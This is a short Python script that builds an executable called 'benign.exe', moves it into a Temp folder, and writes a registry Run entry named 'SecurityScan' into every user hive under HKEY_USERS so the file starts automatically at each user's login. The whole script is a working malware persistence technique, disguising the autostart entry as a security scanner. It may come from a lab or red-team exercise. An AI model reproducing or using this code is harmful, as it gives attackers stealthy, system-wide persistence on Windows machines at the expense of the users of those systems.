import os
import shutil
import winreg

file_dir = os.path.join(os.getcwd(), "Temp")
file_name = "benign.exe"
file_path = os.path.join(file_dir, file_name)

if os.path.isfile(file_path):
    os.remove(file_path)

os.system("python ./BuildExe.py")

shutil.move(file_name, file_dir)

reg_hive = winreg.HKEY_USERS
reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"


for i in range(winreg.QueryInfoKey(reg_hive)[0]):
    sub_key = winreg.EnumKey(reg_hive, i)
    sub_path = f"{sub_key}\\{reg_path}"
    try:
        key = winreg.OpenKey(reg_hive, sub_path, 0, access=winreg.KEY_WRITE)
        winreg.SetValueEx(key, "SecurityScan", 0, winreg.REG_SZ, file_path)
        print()
        print(f"Succeeded for HKU\\{sub_path}")
        print()
    except Exception as e:
        print()
        print(f"Failed for HKU\\{sub_path}")
        print(e)
        print()
